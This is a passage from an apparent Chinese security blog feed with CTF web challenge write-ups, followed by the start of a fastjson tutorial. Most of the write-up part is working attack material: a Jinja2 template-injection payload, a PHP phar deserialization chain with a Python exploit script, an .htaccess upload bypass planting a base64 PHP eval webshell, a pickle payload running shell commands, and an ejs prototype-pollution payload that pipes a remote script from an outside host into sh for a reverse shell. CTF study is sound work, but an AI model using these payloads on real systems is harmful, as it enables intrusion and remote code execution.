class="built_in">dict</span>(ini=aa,t=bb)|join%&#125;&#123;%<span class="built_in">set</span>(glo)=<span class="built_in">dict</span>(glo=aa,bals=bb)|join%&#125;&#123;%<span class="built_in">set</span>(itm)=<span class="built_in">dict</span>(ite=aa,ms=bb)|join%&#125;&#123;%<span class="built_in">set</span>(pld)=xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right%&#125;&#123;%<span class="keyword">for</span>(f,v)<span class="keyword">in</span>((self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))())%&#125;&#123;%<span class="keyword">if</span>(f==bul)%&#125;&#123;%<span class="keyword">for</span>(a,b)<span class="keyword">in</span>(v|attr(itm))()%&#125;&#123;%<span class="keyword">if</span>(a==ev)%&#125;&#123;&#123;b(pld)&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pharpop"><a href="#pharpop" class="headerlink" title="pharpop"></a>pharpop</h2><p>fast destruct绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;act = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;name = <span class="string">&quot;Error&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;p = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;xxx = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;flag = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/fflaggg&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">////unserialize(serialize($array));</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="comment">//$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="comment">//$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="comment">/*$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub*/</span></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($array); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="comment">////签名自动计算</span></span><br><span class="line"><span class="comment">//$phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9387777-447d-46ce-8295-66f80f1d49f9.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">&quot;./flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>:pic,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;; &#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>:<span class="string">&quot;phar:///tmp/7e58c362cae57c86436a19f1d3781761.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;; &#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># upload()</span></span><br><span class="line"></span><br><span class="line">    read()</span><br></pre></td></tr></table></figure>

<p>phar用下面方法绕过：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">新建.phar</span><br><span class="line">cd .phar</span><br><span class="line">新建matadata</span><br><span class="line">把处理过的序列化字符串加进去，下面是处理好的</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;apple&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;xxx&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;air&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Error&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/fflaggg&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;N;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>tar压缩，再用gizp压缩即可</p>
<h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p><code>.htaccess</code></p>
<p>对文件后缀没有过滤</p>
<p>对内容有过滤</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522163316-2op0kkw.png" alt="image.png"></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>357</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary65Yxb4VInKlwTfu7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.jpg&quot;</span></span></span><br><span class="line"><span class="language-maxima">Content-Type: <span class="built_in">image</span>/jpeg</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">#<span class="built_in">define</span> <span class="built_in">width</span> <span class="number">1337</span></span></span><br><span class="line"><span class="language-maxima">#<span class="built_in">define</span> <span class="built_in">height</span> <span class="number">1337</span></span></span><br><span class="line"><span class="language-maxima">APD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">提交</span></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7--</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">POST / HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-maxima">Host: d5cf5b4b-<span class="number">0b56</span>-4c7d-8ca0-<span class="number">0bbd7f22729d.</span>node4.buuoj.cn:<span class="number">81</span></span></span><br><span class="line"><span class="language-maxima">Content-Length: <span class="number">436</span></span></span><br><span class="line"><span class="language-maxima">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span></span><br><span class="line"><span class="language-maxima">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-maxima">Origin: http://d5cf5b4b-<span class="number">0b56</span>-4c7d-8ca0-<span class="number">0bbd7f22729d.</span>node4.buuoj.cn:<span class="number">81</span></span></span><br><span class="line"><span class="language-maxima">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.67</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-maxima">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,<span class="built_in">image</span>/avif,<span class="built_in">image</span>/webp,<span class="built_in">image</span>/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Referer: http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81/</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Accept-Encoding: gzip, deflate</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Connection: close</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Type: image/jpeg</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">#define width 1337</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">#define height 1337</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">AddType application/x-httpd-php .jpg</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Disposition: form-data; name=&quot;1&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">提交</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7--</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522163225-f3ot1w6.png" alt="image.png"></p>
<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#config.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure>


<p>直接import config然后调用backdoor就行，中间该mark的mark，最后用抛出异常来读即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">s: <span class="built_in">str</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b64encode(s.encode()).decode(encoding=encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exc = <span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /*&#x27;).read())&quot;</span></span><br><span class="line">exc = base64_encode(exc).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;exec(__import__(&quot;base64&quot;).b64decode(b&quot;%s&quot;))&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span>% (exc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(b64encode(opcode).decode()))</span><br></pre></td></tr></table></figure>


<h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p>组件的话，除了ejs差了一个小版本其他都是最新的</p>
<p>ejs这里的漏洞加了过滤绕不开，但是也学习了一下<a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">CVE-2022-29078</a></p>
<p>修复：</p>
<p><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522235023-imzuorg.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522235003-k11pwyw.png" alt="image.png"></p>
<p><a href="http://suphp.cn/anquanke/54/236354.html">http://suphp.cn/anquanke/54/236354.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;view options&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:true,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl https://your-shell.com/1.117.144.41:4444 | sh&#x27;);&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:true,<span class="string">&quot;debug&quot;</span>:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Really-Easy-SQL-amp-Sql"><a href="#Really-Easy-SQL-amp-Sql" class="headerlink" title="Really Easy SQL&amp;Sql"></a>Really Easy SQL&amp;Sql</h2><p>两道比赛没出，属于是又卡在sql上了，听说之后群里给了hint，把黑名单给出来了，如下</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531232131-75hc3ta.png" alt="image.png"></p>
<p>看了一些赛后的wp，发现其实当时没试出来的原因很有可能是hackbar或者burp传的时候没有对%0之类的url解码，因为他过滤了%0</p>
<p>下图中的%%0d是python中双写百分号起到转义的效果</p>
<p><a href="https://blog.csdn.net/yasi_xi/article/details/38355853">https://blog.csdn.net/yasi_xi&#x2F;article&#x2F;details&#x2F;38355853</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531233248-6geasfk.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>ctfStudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson1.22-1.24反序列化</title>
    <url>/2022/04/27/fastjson1-22templates/</url>
    <content><![CDATA[<h1 id="fastjson基础"><a href="#fastjson基础" class="headerlink" title="fastjson基础"></a>fastjson基础</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><ol>
<li>fastjson 是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean</li>
<li>FastJson 与 Google 的 Gson 都是解析 Json 的强者，两者不相伯仲</li>
<li><a href="https://github.com/alibaba/fastjson" title="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></li>
<li>fastjson 会不定期发布针对 android 版本优化的版本，android优化版本是去掉不必要的代码，减少体积，功能和标准版本基本一样。 已发布的android版本包括：<a href="http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/">http://repo1.maven.org/maven2/com/alibaba/fastjson/1.1.51.android/</a><br /></li>
</ol>
<p>maven配置一下依赖就能开始用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span><span class="number">.49</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>


<h1 id="Map转JSON字符串"><a href="#Map转JSON字符串" class="headerlink" title="Map转JSON字符串"></a>Map转JSON字符串</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">map2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map1.put(<span class="string">&quot;key2&quot;</span>,<span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(map1);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420143036-shht8mn.png" alt="image.png"></p>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><h2 id="POJO-List-转-JSON-字符串"><a href="#POJO-List-转-JSON-字符串" class="headerlink" title="POJO List 转 JSON 字符串"></a>POJO List 转 JSON 字符串</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson.demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.basic.Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pojolist2json</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">mike</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Mike&quot;</span>, <span class="number">19</span>);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">nancy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Nancy&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Person&gt; persons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        persons.add(mike);</span><br><span class="line">        persons.add(nancy);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(persons);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220420144603-wtodusg.png" alt="image.png">1</p>
